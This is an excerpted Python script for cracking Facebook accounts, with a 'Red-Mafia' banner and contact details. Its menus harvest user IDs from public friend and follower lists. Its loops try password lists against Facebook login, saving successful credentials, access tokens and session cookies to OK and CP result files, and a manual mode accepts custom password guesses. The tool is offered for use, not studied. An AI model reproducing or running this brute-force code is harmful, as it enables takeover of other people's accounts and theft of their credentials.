...
██║ ╚═╝ ██║██║  ██║██║     ██║██║  ██║
╚═╝     ╚═╝╚═╝  ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝
\x1b[0;32m______ _______ _______ _     _  _____ 
\x1b[0;33m_  ____/ |______ |______ |____/  |     |
\x1b[0;35m_ /_____ |______ |______ |    \_ |_____|
                                       
\x1b[0;33m║WELCOME BACK SIR

\x1b[0;34m║#FACEBOOK : Red-Mafia(RK)
\x1b[0;33m║#WHATSAP : 03188214452.                   
...
def menu():
	...
	try:
		...
		exit("\033[1;96m[\033[1;93m+\033[1;93m] Token Lost")
	...
	print("\n\033[1;93m[\033[1;94m01\033[1;94m] CRACK ID FROM PUBLIC FRIENDS")

	print("\033[1;93m[\033[1;94m02\033[1;94m] CRACK ID FROM PUBLIC FOLLOWERS")

	print("\033[1;93m[\033[1;94m03\033[1;94m] MULTIPLE-ID's CRACK\033[1;93m [ \033[1;95mPRO \033[1;97m]")

	print("\033[1;93m[\033[1;94m04\033[1;94m] Chack Crack Results")

	print("\033[1;93m[\033[1;94m05\033[1;94m] USER-AGENT SETTINGS\033[1;97m [ \033[1;95mPRO \033[1;97m]")

	print("\033[1;93m[\033[1;94m00\033[1;94m] Exit\033[1;97m [ \033[1;91mREMEO TOKEN \033[1;97m]")
	...
	elif ZEEKO == "1" or KING == "01":

		publik()

		method()

	elif MR == "2" or ZEEKO == "02":

		follower()

		method()

	elif MR == "3" or ZEEKO   == "03":

		massal()

		method()

	elif MR == "4" or ZEEKO == "04":

		print("\n\033[1;92m[\033[1;93m01\033[1;94m] CHECK CRACK RESULTS OK")

		print("\033[1;93m[\033[1;94m02\033[1;94m] CHECK RESULTS CP")

		cek = raw_input("\n\033[1;93m[\033[1;94m+\033[1;96m] CHOOSE : ")
	...
	elif MR == "5" or ZEEKO == "05":

		setting_ua()

	elif MR == "0" or ZEEKO == "00":
...
def method():
	...
	print("\033[1;93m[\033[1;94m1\033[1;97m] B-API\033[1;97m [ \033[1;95mRed-Mafia/FASTER \033[1;97m]")
	...
	try:
		...
		for pw in pwx:
			...
			if "session_key" in send.text and "EAAA" in send.text:
				...
				print("\r\033[0;94m[ZEEKO-OK] %s|%s|%s\033[0;97m"%(uid, pw, send.json()["access_token"]))
				...
				print("\r\033[0;96m[ZEEKO-CP] %s|%s\033[0;92m        "%(uid, pw))

				cp.append("%s|%s"%(uid, pw))

				open("CP/%s.txt"%(tZEEKO),"a").write(" + %s|%s\n"%(uid, pw))
	...
	try:
		...
		for pw in pwx:
			...
			if "c_user" in ses.cookies.get_dict().keys():
				...
				print("\r\033[0;96m[ZEEKO-CP] %s|%s\033[0;96m        "%(uid, pw))
	...
	try:
		...
		for pw in pwx:
			...
			if "c_user" in ses.cookies.get_dict().keys():
				...
				print("\r\033[0;94m[ZEEKO-OK] %s|%s|%s\033[0;97m"%(uid, pw, kuki))

				ok.append("%s|%s"%(uid, pw))

				open("OK/%s.txt"%(tZEEKO),"a").write(" + %s|%s\n"%(uid, pw))
				...
				print("\r\033[0;96m[ZEEKO-CP] %s|%s\033[0;91m        "%(uid, pw))
...
def manual():
	...
	print("\n[+] Type , For 2nd Password For Example : KHANKHAN,@@&&@@,114477,JO LAGAE WO APKI MARZI etc")
		...
		try:
			...
			for pw in asu:
				...
				if "c_user" in ses.cookies.get_dict().keys():
					...
					print("\r\033[0;94m[MR-OK] %s|%s|%s\033[0;97m"%(uid, pw, kuki))
